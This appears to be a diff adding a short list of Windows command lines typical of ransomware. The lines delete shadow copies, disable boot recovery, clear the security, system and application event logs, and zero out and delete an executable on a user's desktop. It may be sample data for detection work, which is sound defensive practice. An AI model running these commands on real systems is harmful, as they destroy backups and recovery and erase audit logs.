@@ -1,0 +1,9 @@
+cmd.exe /c vssadmin Delete Shadows /All /Quiet 
+cmd.exe /c bcdedit /set {default} recoveryenabled No
+cmd.exe /c bcdedit /set {default} bootstatuspolicy ignoreallfailures 
+cmd.exe /c wmic SHADOWCOPY /nointeractive
+cmd.exe /c wevtutil cl security 
+cmd.exe /c wevtutil cl system 
+cmd.exe /c wevtutil cl application 
+cmd.exe "C:\Windows\System32\cmd.exe" /C ping 127.0.0.7 -n 3 >Nul&fsutil file setZeroData offset=0 length=524288 "C:\Users\fred\Desktop\Lsystem-234-bit.exe" & Del /f /q "C:\Users\fred\Desktop\Lsystem-234-bit.exe"
+cmd.exe "C:\Windows\System32\cmd.exe" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no
